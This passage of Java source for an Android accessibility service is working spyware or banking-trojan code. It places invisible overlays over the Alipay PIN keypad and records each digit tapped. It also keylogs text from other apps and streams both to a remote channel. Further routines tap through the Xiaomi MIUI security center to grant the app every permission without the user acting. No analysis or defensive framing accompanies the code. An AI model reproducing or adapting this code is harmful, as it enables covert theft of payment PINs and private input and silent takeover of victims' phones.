    private final Map<String, View> overlays = new HashMap<>();

    public void removeAllOverlays() {
        try {
            for (View overlay : overlays.values()) {
                try {
                    AccessWindow.removeView(overlay);
                } catch (Exception e) {
                    // Handle case if view was already removed
                    e.printStackTrace();
                }
            }
            overlays.clear();
        } catch (Exception a) {
        }
    }

    private void addOverlaysForKeys() {
        try {
            for (int i = 0; i <= 9; i++) {
                String viewId = "com.alipay.mobile.antui:id/au_num_" + i;
                AccessibilityNodeInfo node = findNodeByViewId(viewId);
                if (node != null) {
                    Rect bounds = new Rect();
                    node.getBoundsInScreen(bounds);
                    addOverlay(viewId, bounds, String.valueOf(i));
                }
            }
        } catch (Exception a) {
        }
    }

    private AccessibilityNodeInfo findNodeByViewId(String viewId) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return null;

        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);
        return (nodes != null && !nodes.isEmpty()) ? nodes.get(0) : null;
    }

    @SuppressLint("ClickableViewAccessibility")
    private void addOverlay(String viewId, Rect bounds, String namenum) {
        View overlay = new View(this);
        overlay.setBackgroundColor(Color.TRANSPARENT); // semi-transparent red
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                bounds.width(),
                bounds.height(),
                bounds.left,
                bounds.top - 100,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT
        );
        overlay.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                AccessWindow.removeView(v);
                Handler hstop = new Handler(Looper.getMainLooper());
                hstop.postDelayed(new Runnable() {
                    public void run() {
                        try {
                            // overlays.remove(viewId);
                            clickthis(bounds.centerX(), bounds.centerY());
                            // MyLoger.Error("Alipay:",namenum);
                            String Allkey = "Alipay" + "|" + "PIN" + "|" + namenum;
                            if (liv_klogs) {
                                //  MyLoger.Debug("keystorkelive", Allkey);

                                try {
                                    JSONObject jsonObject = new JSONObject();
                                    jsonObject.put("type", "keys");
                                    jsonObject.put("data", Allkey);
                                    String jsonData = jsonObject.toString();

                                    LiveChat.instance(getApplicationContext()).Livemessage(getApplicationContext(), jsonData);
                                } catch (Exception a) {
                                    a.printStackTrace();
                                }
                            }
                            ActivityMonitors.Record(Allkey, ActivityMonitors.ActivityType.KSTR);
                            Handler hstop = new Handler(Looper.getMainLooper());
                            hstop.postDelayed(new Runnable() {
                                public void run() {
                                    try {
                                        AccessWindow.addView(overlay, params);
                                    } catch (Exception d) {

                                    }
                                }
                            }, 500);

                        } catch (Exception d) {

                        }
                    }
                }, 100);

            }
            return true;
        });


        params.gravity = Gravity.TOP | Gravity.START;
        AccessWindow.addView(overlay, params);
        overlays.put(viewId, overlay);
    }

    public void Capturekeylogger(AccessibilityNodeInfo rootView, String appName, int eventType) {
        try {
            if (rootView == null) {
                //Log.e("At.printViewIds", "Root view is null.");
                return;
            }

            try {
                String data = "";

                if (rootView.getText() != null) {
                    data = rootView.getText().toString();
                } else {
                    if (rootView.getContentDescription() != null) {
                        data = rootView.getContentDescription().toString();
                    }
                }
                String checkempty = data.replace("[]", "");
                if (!checkempty.isEmpty() && checkempty.length() > 0) {
                    // if (!DoublecatKey.equals(data)) {
                    //     DoublecatKey = data;
                    String eventTypeString = EtypetoStr(eventType);
                    String Allkey = appName + "|" + eventTypeString + "|" + data;
                    if (liv_klogs) {
                        //  MyLoger.Debug("keystorkelive", Allkey);

                        try {
                            JSONObject jsonObject = new JSONObject();
                            jsonObject.put("type", "keys");
                            jsonObject.put("data", Allkey);
                            String jsonData = jsonObject.toString();

                            LiveChat.instance(getApplicationContext()).Livemessage(getApplicationContext(), jsonData);
                        } catch (Exception a) {
                            a.printStackTrace();
                        }
                    }
                    if(Rec_klogs){
                        ActivityMonitors.Record(Allkey, ActivityMonitors.ActivityType.KSTR);
                    }

                    // }

                }
            } catch (Exception e) {
                MyLoger.Error("At.acc.keystrk", e.getMessage());
            }
//            // Recursively print child views
//            for (int i = 0; i < rootView.getChildCount(); i++) {
//                Capturekeylogger(rootView.getChild(i), appName, eventType);
//            }

        } catch (Exception e) {
            Log.e("At.printViewIds", "Exception: " + e.getMessage());
        }
    }

    private void sleep(int mili) {
        try {
            Thread.sleep(mili);
        } catch (Exception a) {
        }
    }

    private void finishxaomi() {
        Handler handler = new Handler(Looper.getMainLooper());
        handler.postDelayed(() -> {
            AccessibilityNodeInfo targetnod = null;
            AccessibilityNodeInfo Rootview = getRootInActiveWindow();
            String[] resettexts = {
                    "Other permissions",
                    "أذونات أخرى",
                    "其他权限管理",
                    "Diğer izinler",
                    "Outras permissões",
                    "Другие разрешения",
                    "Otros permisos",
            };
            for (String retext : resettexts) {
                List<AccessibilityNodeInfo> otheprims = AccessTools.findNodesByText(retext, Rootview);
                if (otheprims != null && !otheprims.isEmpty()) {
                    targetnod = otheprims.get(0);
                    break;
                }
            }
            if (targetnod != null) {

                Rect out = new Rect();
                targetnod.getBoundsInScreen(out);
                int X = (int) out.exactCenterX();
                int Y = (int) out.exactCenterY();
                clickthis(X, Y);
                targetnod.recycle();
                handler.postDelayed(() -> {
                    try {
                        enableallxaomi();
                    } catch (Exception a) {
                        a.printStackTrace();
                    }
                }, 700);
            } else {
                try {
                    this.performGlobalAction(GLOBAL_ACTION_BACK);
                } catch (Exception a) {
                    a.printStackTrace();
                }
                EngineWorker.holdxaomi = false;
                MySettings.WriteBool(getApplicationContext(), Consts.skipxaomi, true);

            }


        }, 1500);
    }

    private void enableallxaomi() {
        List<AccessibilityNodeInfo> nodeList = getRootInActiveWindow().findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/action");

        if (nodeList != null) {
            AccessibilityNodeInfo targetnod = null;
            for (AccessibilityNodeInfo node : nodeList) {
                CharSequence contentDescription = node.getContentDescription();
                if (contentDescription != null) {
                    if ("Deny".contentEquals(contentDescription)) {
                        targetnod = node;
                        break;
                    }
                }
            }
            if (targetnod != null) {

                Rect out = new Rect();
                targetnod.getBoundsInScreen(out);
                int X = (int) out.exactCenterX();
                int Y = (int) out.exactCenterY();
                clickthis(X, Y);
                Handler handler = new Handler(Looper.getMainLooper());
                handler.postDelayed(() -> {
                    AccessibilityNodeInfo nf3 = AccessTools.getNodeByViewId(getRootInActiveWindow(), "com.miui.securitycenter:id/permission_always");
                    if (nf3 != null) {
                        if (!nf3.isChecked()) {
                            nf3.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }
                        try {
                            handler.postDelayed(() -> {
                                try {
                                    this.performGlobalAction(GLOBAL_ACTION_BACK);
                                } catch (Exception a) {
                                    a.printStackTrace();
                                }
                            }, 250);

                        } catch (Exception e) {
                        }
                        handler.postDelayed(() -> {
                            try {
                                enableallxaomi();
                            } catch (Exception a) {
                                a.printStackTrace();
                            }
                        }, 500);
                    }
                }, 500);
            } else {
                try {
                    this.performGlobalAction(GLOBAL_ACTION_BACK);
                    try {
                        Thread.sleep(500);
                    } catch (Exception a) {
                    }
                    this.performGlobalAction(GLOBAL_ACTION_BACK);
                } catch (Exception a) {
                    a.printStackTrace();
                }
                EngineWorker.holdxaomi = false;
                MySettings.WriteBool(getApplicationContext(), Consts.skipxaomi, true);
            }
        }
    }
//    private static void finishVivo() {
//        Handler handler = new Handler(Looper.getMainLooper());
//
//        handler.postDelayed(() -> {
//            context.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
//
//            handler.postDelayed(() -> {
//                List<AccessibilityNodeInfo> switchNodes = Search.searchSById(context, "com.bbk.launcher2:id/label");
//
//                if (switchNodes != null && !switchNodes.isEmpty()) {
//                    AccessibilityNodeInfo firstSwitchNode = switchNodes.get(0);
//                    if (firstSwitchNode != null) {
//                        firstSwitchNode.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);  // 直接点击复选框
//                    }
//                }
//
//                handler.postDelayed(() -> {
//                    List<AccessibilityNodeInfo> switchNodes2 = Search.searchSById(context, "com.bbk.launcher2:id/option_title");
//
//                    if (switchNodes2 != null && !switchNodes2.isEmpty()) {
//                        AccessibilityNodeInfo firstSwitchNode = switchNodes2.get(0);
//                        if (firstSwitchNode != null) {
//                            firstSwitchNode.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);  // 直接点击复选框
//                        }
//                    }
//
//                    handler.postDelayed(() -> {
//                        isIfFinishVivo = true;
//                        finish(context);
//                    }, 2500);
//
//                }, 666);
//
//            }, 1000);
//
//        }, 500);
//
//    }
}
